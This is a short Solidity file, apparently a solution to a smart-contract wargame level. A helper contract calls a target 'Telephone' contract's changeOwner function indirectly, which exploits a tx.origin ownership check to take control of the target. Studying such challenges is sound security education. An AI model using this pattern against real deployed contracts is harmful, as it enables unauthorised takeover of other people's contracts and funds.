pragma solidity ^0.4.18;

contract Telephone {
    
  function changeOwner(address _owner) public;
}

contract TelephoneCaller {

  function callChangeOwner(address telephoneContractAddress, address newOwnerAddress) public {
    Telephone telephoneContract = Telephone(telephoneContractAddress);
    telephoneContract.changeOwner(newOwnerAddress);
  }
}

